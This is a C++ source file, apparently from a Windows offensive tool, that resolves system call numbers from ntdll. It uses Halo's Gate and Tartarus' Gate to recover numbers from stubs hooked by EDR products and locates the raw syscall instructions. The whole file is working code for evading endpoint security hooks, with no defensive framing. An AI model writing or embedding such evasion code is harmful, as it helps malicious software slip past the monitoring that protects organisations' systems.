#include "stdafx.h"
#include "ssn_resolver.h"
#include "logger.h"
#include <vector>
#include <unordered_map>
#include <string>
#include <algorithm>

namespace SsnResolver {

namespace {

std::vector<SyscallEntry> g_entries;
std::unordered_map<std::string, size_t> g_nameIndex;
size_t g_hookedCount = 0;
bool g_initialized = false;

// Check if a function stub looks like a standard ntdll syscall stub:
// 4C 8B D1         mov r10, rcx
// B8 xx xx 00 00   mov eax, SSN
// ...
// 0F 05            syscall
// C3               ret
bool IsCleanStub(PBYTE pFunc, DWORD* pSSN) {
    // Check for: mov r10, rcx (4C 8B D1)
    if (pFunc[0] == 0x4C && pFunc[1] == 0x8B && pFunc[2] == 0xD1) {
        // Check for: mov eax, imm32 (B8 xx xx xx xx)
        if (pFunc[3] == 0xB8) {
            *pSSN = *(DWORD*)(pFunc + 4);
            return true;
        }
    }
    return false;
}

// Halo's Gate: If a function is hooked, search neighboring functions
// to find a clean stub and derive the SSN by offset.
bool HalosGate(PBYTE pFunc, DWORD* pSSN) {
    // Search up to 512 bytes in each direction (typically ~16 functions)
    for (int distance = 1; distance <= 16; distance++) {
        // Search downward (higher addresses)
        PBYTE pDown = pFunc + (distance * 32); // ntdll stubs are ~32 bytes
        DWORD downSSN = 0;
        if (IsCleanStub(pDown, &downSSN)) {
            *pSSN = downSSN - distance;
            return true;
        }

        // Search upward (lower addresses)
        PBYTE pUp = pFunc - (distance * 32);
        DWORD upSSN = 0;
        if (IsCleanStub(pUp, &upSSN)) {
            *pSSN = upSSN + distance;
            return true;
        }
    }
    return false;
}

// Tartarus' Gate: Extended hook detection for jmp-at-offset patterns.
// Some EDRs place the hook at byte +5 or +8 instead of byte 0.
bool TartarusGate(PBYTE pFunc, DWORD* pSSN) {
    // Check if byte 3 is a jmp (E9) — hook placed after mov r10, rcx
    if (pFunc[0] == 0x4C && pFunc[1] == 0x8B && pFunc[2] == 0xD1 &&
        pFunc[3] == 0xE9) {
        // The function has 'mov r10, rcx' but then jumps away.
        // We can't read the SSN directly. Fall back to Halo's Gate.
        return HalosGate(pFunc, pSSN);
    }

    // Check if byte 5 is a jmp (hook after mov eax, SSN)
    if (pFunc[0] == 0x4C && pFunc[1] == 0x8B && pFunc[2] == 0xD1 &&
        pFunc[3] == 0xB8) {
        // SSN is readable even though there's a hook later
        *pSSN = *(DWORD*)(pFunc + 4);
        // But verify the hook doesn't corrupt execution
        if (pFunc[8] == 0xE9 || pFunc[8] == 0xFF) {
            return true; // SSN is valid, hook is after it
        }
    }

    return false;
}

// Find the syscall instruction address within a function
PVOID FindSyscallAddr(PBYTE pFunc) {
    for (int i = 0; i < 64; i++) {
        if (pFunc[i] == 0x0F && pFunc[i + 1] == 0x05) {
            return pFunc + i;
        }
    }
    return nullptr;
}

} // namespace

bool Initialize() {
    if (g_initialized) return true;

    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return false;

    auto pDosHdr = reinterpret_cast<PIMAGE_DOS_HEADER>(hNtdll);
    auto pNtHdr = reinterpret_cast<PIMAGE_NT_HEADERS>(
        (PBYTE)hNtdll + pDosHdr->e_lfanew);
    auto& exportDir = pNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

    if (exportDir.Size == 0) return false;

    auto pExport = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(
        (PBYTE)hNtdll + exportDir.VirtualAddress);
    auto pNames = reinterpret_cast<PDWORD>((PBYTE)hNtdll + pExport->AddressOfNames);
    auto pFuncs = reinterpret_cast<PDWORD>((PBYTE)hNtdll + pExport->AddressOfFunctions);
    auto pOrdinals = reinterpret_cast<PWORD>((PBYTE)hNtdll + pExport->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
        const char* name = (const char*)((PBYTE)hNtdll + pNames[i]);

        // Only process Nt* functions (syscall stubs)
        if (name[0] != 'N' || name[1] != 't') continue;

        PBYTE pFunc = (PBYTE)hNtdll + pFuncs[pOrdinals[i]];
        DWORD ssn = 0;
        bool hooked = false;

        if (IsCleanStub(pFunc, &ssn)) {
            // Clean, unhooked function
        } else if (TartarusGate(pFunc, &ssn)) {
            hooked = true;
            g_hookedCount++;
        } else if (HalosGate(pFunc, &ssn)) {
            hooked = true;
            g_hookedCount++;
        } else {
            continue; // Can't resolve this one
        }

        SyscallEntry entry = {};
        entry.ssn = ssn;
        entry.pFuncAddr = pFunc;
        entry.pSyscallAddr = FindSyscallAddr(pFunc);
        entry.hooked = hooked;
        strncpy_s(entry.funcName, name, sizeof(entry.funcName) - 1);

        g_nameIndex[name] = g_entries.size();
        g_entries.push_back(entry);
    }

    g_initialized = true;
    VERBOSE(L"SsnResolver: Resolved %zu syscalls (%zu hooked via Halo's/Tartarus' Gate)",
            g_entries.size(), g_hookedCount);
    return true;
}

const SyscallEntry* GetEntry(const char* funcName) {
    if (!g_initialized) Initialize();
    auto it = g_nameIndex.find(funcName);
    if (it == g_nameIndex.end()) return nullptr;
    return &g_entries[it->second];
}

size_t GetResolvedCount() { return g_entries.size(); }
size_t GetHookedCount() { return g_hookedCount; }

} // namespace SsnResolver
